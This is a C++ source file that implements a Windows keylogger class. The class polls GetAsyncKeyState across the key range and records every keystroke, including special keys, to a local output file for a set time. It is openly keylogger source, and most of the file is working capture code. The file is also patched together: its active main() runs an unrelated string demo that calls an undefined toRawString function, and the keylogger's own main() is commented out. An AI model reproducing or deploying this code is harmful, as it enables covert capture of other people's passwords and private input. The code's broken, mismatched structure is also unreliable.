#include <iostream>
#include <windows.h>
#include <string>
#include <vector>
#include <unordered_map>
#include <fstream>
#include <time.h>

#include <thread>

using namespace std;

#define IS_PRESSING	1 << (sizeof(SHORT) * 8 - 1)
#define PRESSED	1

class KeyLogger {
	private:
		string file_name;
		static unordered_map<int, string> vkey;
		bool getSpecialKey(int key, string& key_name);
		void keylog();
		bool running;
		int max_running_time = 300;

	public:
		KeyLogger(string file_name) : file_name(file_name) {} 
		void start() {running = true; keylog();}
		void stop() {running = false;}
};

unordered_map<int, string> KeyLogger::vkey = {
			{VK_TAB, "[ TAB ]"},
			{VK_RETURN, "[ ENTER ]"},
			{VK_BACK, "[ BACKSPACE ]"},
			{VK_SHIFT, ""},
			{VK_LSHIFT, "[ LSHIFT ]"},
			{VK_RSHIFT, "[ RSHIFT ]"},
			{VK_CAPITAL, "[ CAPS_LOCK ]"},
			{VK_CONTROL, ""},
			{VK_LCONTROL, "[ LCTRL ]"},
			{VK_RCONTROL, "[ RCTRL ]"},
			{VK_MENU, ""},
			{VK_LMENU, "[ LALT ]"},
			{VK_RMENU, "[ RALT ]"},
			{VK_LWIN, "[ LWINDOWS ]"},
			{VK_RWIN, "[ RWINDOWS ]"},
			{VK_SPACE, " "},
			{VK_UP, "[ UP ]"},
			{VK_DOWN, "[ DOWN ]"},
			{VK_LEFT, "[ LEFT ]"},
			{VK_RIGHT, "[ RIGHT ]"},
			{VK_DELETE, "[ DELETE ]"},
			{VK_ESCAPE, "[ ESC ]"},
			{VK_OEM_PLUS, "[ =+ ]"},
			{VK_OEM_MINUS, "[ -_ ]"},
			{VK_OEM_PERIOD, "[ .> ]"},
			{VK_OEM_COMMA, "[ ,< ]"},
			{VK_OEM_1, "[ ;: ]"},
			{VK_OEM_2, "[ /? ]"},
			{VK_OEM_3, "[ `~ ]"},
			{VK_OEM_4, "[ [{ ]"},
			{VK_OEM_5, "[ \\| ]"},
			{VK_OEM_6, "[ ]} ]" },
			{VK_OEM_7, "[ \'\" ]"},
			{VK_NUMPAD0, "[ NUMPAD_0 ]"},
			{VK_NUMPAD1, "[ NUMPAD_1 ]"},
			{VK_NUMPAD2, "[ NUMPAD_2 ]"},
			{VK_NUMPAD3, "[ NUMPAD_3 ]"},
			{VK_NUMPAD4, "[ NUMPAD_4 ]"},
			{VK_NUMPAD5, "[ NUMPAD_5 ]"},
			{VK_NUMPAD6, "[ NUMPAD_6 ]"},
			{VK_NUMPAD7, "[ NUMPAD_7 ]"},
			{VK_NUMPAD8, "[ NUMPAD_8 ]"},
			{VK_NUMPAD9, "[ NUMPAD_9 ]"},
			{VK_MULTIPLY, "*"},
			{VK_ADD, "+"},
			{VK_SUBTRACT, "-"},
			{VK_DIVIDE, "/"},
			{VK_DECIMAL, "."},
			{VK_PRIOR, "[ PAGE_UP ]"},
			{VK_NEXT, "[ PAGE_DOWN ]"},
			{VK_END, "[ END ]"},
			{VK_HOME, "[ HOME ]"},
			{VK_INSERT, "[ INSERT ]"}
};

bool KeyLogger::getSpecialKey(int key, string& key_name) {
	if (vkey.find(key) == vkey.end()) return false;
	key_name = vkey[key];
	return true;
}

void KeyLogger::keylog() {
	ofstream fout (file_name);
	if (!fout.good()) return;

	int key;
	string key_name;

	// clear keystroke recorded before
	for (key = 0x08; key <= 0xE2; key++) {
		GetAsyncKeyState(key);
	}

	int end_time = time(0) + max_running_time;
	while (running && time(0) < end_time) {
		for (key = 0x08; key <= 0xE2; key++) {
			if (GetAsyncKeyState(key) & PRESSED) {
				if (getSpecialKey(key, key_name)) {
					fout << key_name;
				}
				else if (0x30 <= key && key <= 0x5A) {
					fout << char(key);
				}
			}
		}
	}

	fout.close();
}


int main() {
    std::string normalString = "Hello\nWorld! \"C++\" is awesome!";
    std::string rawString = toRawString(normalString);

    std::cout << "Original String:\n" << normalString << "\n\n";
    std::cout << "Raw String Representation:\n" << rawString << "\n";

    return 0;
}

// int main() {
// 	KeyLogger kl("output.txt");

// 	thread t1 (&KeyLogger::start, &kl);

// 	t1.join();
	
	
// 	return 0;
// }